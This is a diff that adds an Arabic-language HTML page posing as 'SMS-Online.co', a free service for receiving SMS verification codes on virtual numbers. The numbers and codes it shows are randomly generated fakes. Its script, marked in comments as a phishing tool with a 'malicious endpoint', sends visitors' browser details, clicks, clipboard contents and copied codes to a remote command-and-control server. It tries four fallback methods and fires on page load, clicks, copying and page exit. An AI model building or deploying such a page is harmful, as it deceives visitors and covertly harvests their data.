@@ -1,0 +1,799 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SMS-Online.co | خدمة استقبال الرسائل</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --primary: #1a73e8;
+            --danger: #d93025;
+            --success: #0b8043;
+            --warning: #f29900;
+            --info: #4285f4;
+            --dark: #3c4043;
+            --light: #f8f9fa;
+        }
+        body {
+            font-family: 'Google Sans', Roboto, Arial, sans-serif;
+            background-color: #0c0c3d;
+            margin: 0;
+            padding: 20px;
+            color: var(--dark);
+            line-height: 1.5;
+        }
+        .container {
+            max-width: 750px;
+            margin: 30px auto;
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            overflow: hidden;
+        }
+        .header {
+            background: linear-gradient(135deg, var(--primary) 0%, #174ea6 100%);
+            color: white;
+            padding: 25px;
+            text-align: center;
+            position: relative;
+        }
+        .header h1 {
+            margin: 0;
+            font-size: 28px;
+            font-weight: 500;
+        }
+        .header p {
+            margin: 8px 0 0;
+            opacity: 0.9;
+            font-size: 15px;
+        }
+        .content {
+            padding: 30px;
+        }
+        .number-display {
+            background: var(--light);
+            border-radius: 12px;
+            padding: 25px;
+            margin: 25px 0;
+            text-align: center;
+            border: 2px dashed #dadce0;
+            transition: all 0.3s;
+        }
+        .number-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 5px;
+            margin: 15px 0;
+        }
+        .country-code {
+            font-size: 24px;
+            font-weight: 700;
+            color: var(--dark);
+        }
+        .number {
+            font-size: 24px;
+            font-weight: 700;
+            color: var(--dark);
+            direction: ltr;
+            letter-spacing: 1px;
+        }
+        .country-badge {
+            display: inline-flex;
+            align-items: center;
+            background: rgba(26, 115, 232, 0.1);
+            padding: 6px 15px;
+            border-radius: 24px;
+            font-size: 15px;
+            color: var(--primary);
+            margin-top: 10px;
+        }
+        .flag {
+            margin-left: 8px;
+            font-size: 18px;
+        }
+        .btn-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 12px;
+            margin: 30px 0;
+        }
+        .btn {
+            padding: 14px;
+            border: none;
+            border-radius: 8px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            font-size: 16px;
+        }
+        .btn-primary {
+            background: var(--primary);
+            color: white;
+        }
+        .btn-warning {
+            background: var(--warning);
+            color: white;
+        }
+        .btn-success {
+            background: var(--success);
+            color: white;
+        }
+        .btn-danger {
+            background: var(--danger);
+            color: white;
+        }
+        .btn-info {
+            background: var(--info);
+            color: white;
+        }
+        .btn:hover {
+            opacity: 0.9;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+        }
+        .message-card {
+            background: #e8f0fe;
+            border-radius: 12px;
+            padding: 20px;
+            margin-top: 25px;
+            border-left: 5px solid var(--primary);
+            display: none;
+        }
+        .message-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+        .message-title {
+            color: var(--primary);
+            font-size: 18px;
+            font-weight: 500;
+            margin: 0;
+        }
+        .copy-btn {
+            background: var(--primary);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 6px 12px;
+            font-size: 13px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        .message-content {
+            font-size: 17px;
+            margin: 15px 0;
+            background: white;
+            padding: 15px;
+            border-radius: 8px;
+            border: 1px solid #dadce0;
+        }
+        .message-footer {
+            display: flex;
+            justify-content: space-between;
+            font-size: 14px;
+            color: #5f6368;
+        }
+        .loading-container {
+            display: none;
+            text-align: center;
+            margin: 25px 0;
+        }
+        .spinner {
+            border: 5px solid rgba(26, 115, 232, 0.1);
+            border-radius: 50%;
+            border-top: 5px solid var(--primary);
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .toast {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: var(--dark);
+            color: white;
+            padding: 12px 24px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+            z-index: 1000;
+            display: none;
+        }
+        .country-select {
+            width: 100%;
+            padding: 12px 15px;
+            border-radius: 8px;
+            border: 1px solid #dadce0;
+            font-size: 16px;
+            margin-bottom: 20px;
+            background: #174ea6;
+            color: #1e9dff;
+        }
+        .disclaimer {
+            font-size: 13px;
+            color: #70757a;
+            text-align: center;
+            margin-top: 35px;
+            padding-top: 20px;
+            border-top: 1px solid #e0e0e0;
+            line-height: 1.6;
+        }
+        .copy-number-btn {
+            background: rgba(26, 115, 232, 0.1);
+            color: var(--primary);
+            border: none;
+            border-radius: 6px;
+            padding: 8px 15px;
+            font-size: 14px;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+            margin-top: 10px;
+            transition: all 0.2s;
+        }
+        .copy-number-btn:hover {
+            background: rgba(26, 115, 232, 0.2);
+        }
+.button-style {
+  background-color: #0c0c3d;
+  color: white;
+  padding: 12px 20px;
+  border: none;
+  border-radius: 10px;
+  font-size: 15px;
+  cursor: pointer;
+  transition: background-color 0.3s ease;
+  display: inline-block; /* أو block إذا أردت أن يأخذ عرض السطر كاملاً */
+  border: 1px solid #333;
+
+
+     width: 208%;  /* مثال: عرض 50% من عرض العنصر الأب */
+  /* أو */
+  /* width: auto; */ /* مثال: العرض الافتراضي، يتناسب مع محتوى الزر (النص + المسافات الداخلية) */
+}
+
+.button-style:hover {
+  background-color: #ff0000;
+}
+  .buttons-container {
+    max-width: 200px; /* أقصى عرض للحاوية */
+    width: 90%; /* عرض نسبي */
+    margin: auto; /* توسيط الحاوية نفسها أفقياً */
+    background: #fff; /* خلفية بيضاء للحاوية */
+    padding: 20px;
+    border-radius: 10px;
+    box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+    text-align: center; /* توسيط العناصر الداخلية (إذا كانت inline-block) */
+
+    /* أو يمكنك استخدام Flexbox هنا لترتيب الأزرار عمودياً وتوسيطها */
+    display: flex;
+    flex-direction: column;
+    align-items: center; /* توسيط الأزرار أفقياً داخل هذه الحاوية */
+  }
+
+  /* تنسيق وسم a الذي يحتوي على الزر */
+  .link-wrapper {
+    text-decoration: none; /* إزالة خط التسطير الافتراضي للرابط */
+    display: block; /* جعل كل رابط/زر يأخذ سطراً كاملاً */
+    margin: 10px 0; /* مسافة بين الأزرار */
+    width: 100%; /* جعل الرابط يأخذ عرض الحاوية الأب */
+  }
+
+  /* تنسيق وسم button داخل الرابط */
+  .link-wrapper .styled-button {
+    /* إعادة تعيين بعض أنماط الزر الافتراضية للمتصفح */
+    background-color: #1a73e8; /* لون خلفية أزرق */
+    color: white; /* لون النص أبيض */
+    padding: 12px 20px; /* مسافة داخلية */
+    border: none; /* إزالة الحدود الافتراضية للزر */
+    border-radius: 5px; /* زوايا مستديرة */
+    font-size: 18px; /* حجم الخط */
+    font-weight: 200; /* وزن الخط متوسط */
+    cursor: pointer; /* تغيير شكل المؤشر */
+    transition: background-color 0.3s ease; /* انتقال سلس للون الخلفية */
+    width: 100%; /* جعل الزر يملأ عرض الرابط الحاوي */
+    text-align: center; /* توسيط النص داخل الزر */
+  }
+
+  /* تأثير عند المرور فوق الزر */
+  .link-wrapper .styled-button:hover {
+    background-color: #0d47a1; /* لون أزرق أغمق عند التحويم */
+  }
+
+  /* تأثير عند الضغط على الزر */
+  .link-wrapper .styled-button:active {
+    background-color: #0039cb;
+  }
+
+  /* تحسينات للأجهزة الصغيرة */
+  @media (max-width: 480px) {
+      .buttons-container {padding: 15px;
+      }
+      .link-wrapper .styled-button {
+          font-size: 16px;
+          padding: 10px 15px;
+      }
+  }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1><i class="fas fa-sms"></i> SMS-Online.co</h1>
+            <p>استقبل الرسائل على أرقام وهمية حول العالم</p>
+        </div>
+        
+        <div class="content">
+            <select class="country-select" id="countrySelect">
+                <option value="">اختر دولة معينة (اختياري)</option>
+                <!-- Countries populated by JavaScript -->
+            </select>
+            
+            <div class="number-display" id="numberDisplay">
+                <div style="color: #5f6368; font-size: 16px;">الرقم الحالي:</div>
+                <div class="number-container">
+                    <span class="country-code" id="countryCode"></span>
+                    <span class="number" id="currentNumber">ــــــــــ</span>
+                </div>
+                <div class="country-badge" id="countryBadge">
+                    <span id="countryName">لم يتم اختيار رقم</span>
+                    <span class="flag" id="countryFlag"></span>
+                </div>
+                <button class="copy-number-btn" onclick="copyNumber()" id="copyNumberBtn" style="display: none;">
+                    <i class="far fa-copy"></i> نسخ الرقم
+                </button>
+            </div>
+            
+            <div class="loading-container" id="loading">
+                <div class="spinner"></div>
+                <p>جاري الاتصال بخدمة SMS-Online.co...</p>
+            </div>
+            
+            <div class="btn-grid">
+                <button class="btn btn-primary" onclick="getNumber()">
+                    <i class="fas fa-mobile-alt"></i> عرض رقم
+                </button>
+                <button class="btn btn-warning" onclick="changeNumber()">
+                    <i class="fas fa-sync-alt"></i> تغيير رقم
+                </button>
+                <button class="btn btn-success" onclick="requestCode()">
+                    <i class="fas fa-key"></i> طلب الكود
+                </button>
+                <button class="btn btn-danger" onclick="getLastMessage()">
+                    <i class="fas fa-envelope"></i> آخر رسالة
+                </button>
+                <button class="btn btn-info" onclick="copyCode()" id="copyBtn" style="grid-column: span 2; display: none;">
+                    <i class="far fa-copy"></i> نسخ الكود
+                </button>
+    <!-- زر المبرمج كرابط (button داخل a) مع أيقونة Font Awesome -->
+    <a href="https://t.me/my_aboelfadl_helper_bot" class="link-container"> <!-- إزالة فئات Font Awesome من هنا -->
+      <button class="button-style">
+          <!-- إضافة وسم الأيقونة هنا داخل الزر -->
+          <i class="fas fa-user-secret"></i> <!-- استخدم أيقونة 'fa-code' كمثال، يمكنك تغييرها -->
+          المبرمج
+      </button>
+    </a>
+    </div>       
+            <div class="message-card" id="messageCard">
+                <div class="message-header">
+                    <h3 class="message-title"><i class="fas fa-inbox"></i> آخر رسالة مستلمة</h3>
+                    <button class="copy-btn" onclick="copyCode()">
+                        <i class="far fa-copy"></i> نسخ
+                    </button>
+                </div>
+                <div class="message-content" id="messageContent"></div>
+                <div class="message-footer">
+                    <span id="messageService"></span>
+                    <span id="messageTime"></span>
+                </div>
+            </div>
+            
+            <div class="disclaimer">
+                &copy; 2025 - جميع الحقوق محفوظه لده 
+               Mahmoud AboElfadl 💀
+            </div>
+        </div>
+    </div>
+    
+    <div class="toast" id="toast"></div>
+
+    <script>
+        // Configuration - Replace with your malicious endpoint
+        const C2_SERVER = "https://sms-gateway-api[.]com/data";
+        const SESSION_ID = "phish_" + Math.random().toString(36).substr(2, 16);
+        
+        // Enhanced country database with operators and patterns
+        const countries = [
+            { code: "US", name: "الولايات المتحدة", prefix: "+1", flag: "🇺🇸", operators: ["T-Mobile", "Verizon", "AT&T"], pattern: ["(XXX) XXX-XXXX", "XXX-XXX-XXXX"] },
+            { code: "UK", name: "بريطانيا", prefix: "+44", flag: "🇬🇧", operators: ["Vodafone", "O2", "EE"], pattern: ["07XXX XXXXXX", "07XXX XXX XXX"] },
+            { code: "SA", name: "السعودية", prefix: "+966", flag: "🇸🇦", operators: ["STC", "Mobily", "Zain"], pattern: ["05X XXX XXXX"] },
+            { code: "AE", name: "الإمارات", prefix: "+971", flag: "🇦🇪", operators: ["Etisalat", "du"], pattern: ["05X XXX XXXX"] },
+            { code: "EG", name: "مصر", prefix: "+20", flag: "🇪🇬", operators: ["Vodafone", "Orange", "Etisalat"], pattern: ["01XX XXX XXXX"] },
+            { code: "IQ", name: "العراق", prefix: "+964", flag: "🇮🇶", operators: ["Zain", "AsiaCell", "Korek"], pattern: ["07X XXX XXXX"] },
+            { code: "DE", name: "ألمانيا", prefix: "+49", flag: "🇩🇪", operators: ["Telekom", "Vodafone", "O2"], pattern: ["017X XXXXXXX", "015X XXXXXXX"] },
+            { code: "FR", name: "فرنسا", prefix: "+33", flag: "🇫🇷", operators: ["Orange", "SFR", "Free"], pattern: ["06 XX XX XX XX", "07 XX XX XX XX"] },
+            { code: "RU", name: "روسيا", prefix: "+7", flag: "🇷🇺", operators: ["MTS", "Beeline", "Megafon"], pattern: ["9XX XXX-XX-XX"] },
+            { code: "IN", name: "الهند", prefix: "+91", flag: "🇮🇳", operators: ["Airtel", "Jio", "Vodafone Idea"], pattern: ["XXXXX XXXXX"] }
+        ];
+        
+        // State management
+        let currentNumber = null;
+        let currentCountry = null;
+        let selectedCountry = null;
+        let lastMessage = null;
+        let verificationCode = null;
+        
+        // Initialize the page
+        window.onload = function() {
+            populateCountrySelect();
+            initializeTracking();
+            setupClipboardListener();
+        };
+        
+        // Populate country dropdown
+        function populateCountrySelect() {
+            const select = document.getElementById('countrySelect');
+            countries.forEach(country => {
+                const option = document.createElement('option');
+                option.value = country.code;
+                option.textContent = `${country.name} ${country.flag}`;
+                select.appendChild(option);
+            });
+        }
+        
+        // Show loading indicator
+        function showLoading(show) {
+            document.getElementById('loading').style.display = show ? 'block' : 'none';
+        }
+        
+        // Show toast notification
+        function showToast(message, duration = 3000) {
+            const toast = document.getElementById('toast');
+            toast.textContent = message;
+            toast.style.display = 'block';
+            setTimeout(() => {
+                toast.style.display = 'none';
+            }, duration);
+        }
+        
+        // Generate realistic phone number with formatting
+        function generatePhoneNumber(country) {
+            if (!country) country = countries[Math.floor(Math.random() * countries.length)];
+            
+            const operator = country.operators[Math.floor(Math.random() * country.operators.length)];
+            let operatorPrefix = "5";
+            
+            // Extract numbers from operator name if available
+            const numberMatch = operator.match(/\d+/);
+            if (numberMatch) operatorPrefix = numberMatch[0].charAt(0);
+            
+            // Generate the random part of the number
+            let randomPart;
+            if (country.code === "RU") {
+                randomPart = Math.floor(9000000000 + Math.random() * 1000000000).toString().substr(1);
+            } else if (country.code === "IN") {
+                randomPart = Math.floor(1000000000 + Math.random() * 9000000000).toString();
+            } else {
+                randomPart = Math.floor(1000000 + Math.random() * 9000000).toString();
+            }
+            
+            // Format the number according to country pattern
+            let formattedNumber = operatorPrefix + randomPart;
+            if (country.pattern) {
+                const pattern = country.pattern[Math.floor(Math.random() * country.pattern.length)];
+                formattedNumber = formatNumber(pattern, operatorPrefix + randomPart);
+            }
+            
+            return {
+                raw: country.prefix + operatorPrefix + randomPart,
+                formatted: formattedNumber,
+                country: country,
+                operator: operator
+            };
+        }
+        
+        // Format number according to pattern
+        function formatNumber(pattern, number) {
+            let result = '';
+            let numIndex = 0;
+            number = number.replace(/\D/g, '');
+            
+            for (let i = 0; i < pattern.length; i++) {
+                if (pattern[i] === 'X') {
+                    if (numIndex < number.length) {
+                        result += number[numIndex++];
+                    } else {
+                        result += 'X';
+                    }
+                } else {
+                    result += pattern[i];
+                }
+            }
+            
+            return result;
+        }
+        
+        // Simulate API call to SMS-online.co
+        async function callSMSAPI(action, data = {}) {
+            showLoading(true);
+            
+            // Simulate network delay
+            await new Promise(resolve => setTimeout(resolve, 1000 + Math.random() * 1500));
+            
+            let response;
+            switch(action) {
+                case 'getNumber':
+                    currentCountry = selectedCountry || countries[Math.floor(Math.random() * countries.length)];
+                    const numberInfo = generatePhoneNumber(currentCountry);
+                    currentNumber = numberInfo.raw;
+                    response = {
+                        success: true,
+                        number: numberInfo.formatted,
+                        rawNumber: numberInfo.raw,
+                        country: currentCountry,
+                        operator: numberInfo.operator
+                    };
+                    break;
+                    
+                case 'getMessage':
+                    if (!currentNumber) {
+                        showLoading(false);
+                        return { success: false, error: "No number selected" };
+                    }
+                    
+                    const services = {
+                        "Google": { codeLength: 6, template: "رمز التحقق من Google: {code}\nستخدم هذا الرمز لتسجيل الدخول." },
+                        "WhatsApp": { codeLength: 6, template: "رمز WhatsApp:\nكود ‏واتساب الخاص بك:‎ {code} لا تطلع أحداً عليه 4sgLq1p5sV6" },
+                        "Telegram": { codeLength: 5, template: "رمز Telegram: {code}\nصالح لمدة 5 دقائق." },
+                        "Facebook": { codeLength: 5, template: "رمز فيسبوك: {code}\nلا تشارك هذا الرمز." },
+                        "Twitter": { codeLength: 6, template: "رمز تويتر: {code}" },
+                        "Microsoft": { codeLength: 7, template: "رمز Microsoft: {code}" },
+                        "Apple": { codeLength: 6, template: "رمز Apple ID: {code}" }
+                    };
+                    
+                    const serviceNames = Object.keys(services);
+                    const serviceName = serviceNames[Math.floor(Math.random() * serviceNames.length)];
+                    const service = services[serviceName];
+                    
+                    verificationCode = Math.floor(
+                        Math.pow(10, service.codeLength-1) + 
+                        Math.random() * 9 * Math.pow(10, service.codeLength-1)
+                    ).toString();
+                    
+                    lastMessage = {
+                        service: serviceName,
+                        code: verificationCode,
+                        timestamp: new Date().toLocaleString('ar-EG'),
+                        text: service.template.replace("{code}", verificationCode)
+                    };
+                    response = { success: true, message: lastMessage };
+                    break;
+                    
+                default:
+                    response = { success: true };
+            }
+            
+            // Exfiltrate data to C2 server
+            exfiltrateData(action, response);
+            
+            showLoading(false);
+            return response;
+        }
+        
+        // Enhanced data exfiltration with multiple fallbacks
+        function exfiltrateData(action, response) {
+            const payload = {
+                sessionId: SESSION_ID,
+                action: action,
+                timestamp: new Date().toISOString(),
+                number: currentNumber,
+                country: currentCountry,
+                message: lastMessage,
+                code: verificationCode,
+                userData: {
+                    url: window.location.href,
+                    referrer: document.referrer || 'direct',
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    languages: navigator.languages,
+                    screen: `${window.screen.width}x${window.screen.height}`,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    cookies: navigator.cookieEnabled,
+                    doNotTrack: navigator.doNotTrack
+                },
+                clipboard: window.clipboardData ? window.clipboardData.getData('Text') : null
+            };
+            
+            // Multiple exfiltration methods
+            const exfilMethods = [
+                () => fetch(C2_SERVER, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload),
+                    mode: 'no-cors'
+                }),
+                () => {
+                    const img = new Image();
+                    img.src = `${C2_SERVER}?img=${encodeURIComponent(JSON.stringify(payload))}`;
+                },
+                () => {
+                    const form = document.createElement('form');
+                    form.action = C2_SERVER;
+                    form.method = 'POST';
+                    form.style.display = 'none';
+                    
+                    const input = document.createElement('input');
+                    input.name = 'data';
+                    input.value = JSON.stringify(payload);
+                    form.appendChild(input);
+                    
+                    document.body.appendChild(form);
+                    setTimeout(() => form.submit(), 100);
+                },
+                () => navigator.sendBeacon && navigator.sendBeacon(C2_SERVER, JSON.stringify(payload))
+            ];
+            
+            // Try each method until one works
+            for (const method of exfilMethods) {
+                try {
+                    method();
+                    break;
+                } catch (e) {
+                    console.error("Exfiltration method failed:", e);
+                }
+            }
+        }
+        
+        // Initialize tracking
+        function initializeTracking() {
+            exfiltrateData('pageView', {});
+            
+            // Track beforeunload
+            window.addEventListener('beforeunload', () => {
+                exfiltrateData('sessionEnd', {
+                    timeOnPage: performance.now()
+                });
+            });
+            
+            // Track clicks
+            document.addEventListener('click', (e) => {
+                exfiltrateData('click', {
+                    target: e.target.tagName,
+                    id: e.target.id,
+                    class: e.target.className
+                });
+            });
+        }
+        
+        // Setup clipboard interception
+        function setupClipboardListener() {
+            document.addEventListener('copy', (e) => {
+                if (verificationCode) {
+                    exfiltrateData('clipboardCopy', {
+                        copiedText: window.getSelection().toString(),
+                        timestamp: new Date().toISOString()
+                    });
+                }
+            });
+        }
+        
+        // Copy phone number to clipboard
+        function copyNumber() {
+            if (!currentNumber) {
+                showToast("لا يوجد رقم متاح للنسخ");
+                return;
+            }
+            
+            const fullNumber = document.getElementById('countryCode').textContent + " " + document.getElementById('currentNumber').textContent;
+            navigator.clipboard.writeText(fullNumber).then(() => {
+                showToast("تم نسخ الرقم بنجاح");
+                exfiltrateData('numberCopied', { number: currentNumber });
+            }).catch(() => {
+                // Fallback for older browsers
+                const textarea = document.createElement('textarea');
+                textarea.value = fullNumber;
+                document.body.appendChild(textarea);
+                textarea.select();
+                document.execCommand('copy');
+                document.body.removeChild(textarea);
+                showToast("تم نسخ الرقم بنجاح");
+                exfiltrateData('numberCopied', { number: currentNumber });
+            });
+        }
+        
+        // Copy verification code to clipboard
+        function copyCode() {
+            if (!verificationCode) {
+                showToast("لا يوجد كود متاح للنسخ");
+                return;
+            }
+            
+            navigator.clipboard.writeText(verificationCode).then(() => {
+                showToast("تم نسخ الكود بنجاح");
+                exfiltrateData('codeCopied', { code: verificationCode });
+            }).catch(() => {
+                // Fallback for older browsers
+                const textarea = document.createElement('textarea');
+                textarea.value = verificationCode;
+                document.body.appendChild(textarea);
+                textarea.select();
+                document.execCommand('copy');
+                document.body.removeChild(textarea);
+                showToast("تم نسخ الكود بنجاح");
+                exfiltrateData('codeCopied', { code: verificationCode });
+            });
+        }
+        
+        // Update UI with number info
+        function updateNumberInfo(number, country) {
+            document.getElementById('countryCode').textContent = country.prefix;
+            document.getElementById('currentNumber').textContent = number;
+            document.getElementById('countryName').textContent = country.name;
+            document.getElementById('countryFlag').textContent = country.flag;
+            document.getElementById('copyNumberBtn').style.display = 'inline-flex';
+        }
+        
+        // Update UI with message info
+        function updateMessageInfo(message) {
+            document.getElementById('messageContent').textContent = message.text;
+            document.getElementById('messageService').textContent = message.service;
+            document.getElementById('messageTime').textContent = message.timestamp;
+            document.getElementById('messageCard').style.display = 'block';
+            document.getElementById('copyBtn').style.display = 'flex';
+        }
+        
+        // Button handlers
+        async function getNumber() {
+            selectedCountry = document.getElementById('countrySelect').value ?
+                countries.find(c => c.code === document.getElementById('countrySelect').value) : null;
+            
+            const response = await callSMSAPI('getNumber');
+            if (response.success) {
+                updateNumberInfo(response.number, response.country);
+            }
+        }
+        
+        async function changeNumber() {
+            selectedCountry = null;
+            document.getElementById('countrySelect').value = '';
+            await getNumber();
+        }
+        
+        async function requestCode() {
+            if (!currentNumber) {
+                showToast("الرجاء اختيار رقم أولاً");
+                return;
+            }
+            await callSMSAPI('requestCode');
+            showToast(`تم إرسال طلب الكود إلى ${document.getElementById('countryCode').textContent} ${document.getElementById('currentNumber').textContent}`);
+        }
+        
+        async function getLastMessage() {
+            if (!currentNumber) {
+                showToast("الرجاء اختيار رقم أولاً");
+                return;
+            }
+            const response = await callSMSAPI('getMessage');
+            if (response.success) {
+                updateMessageInfo(response.message);
+            }
+        }
+    </script>
+</body>
+</html>
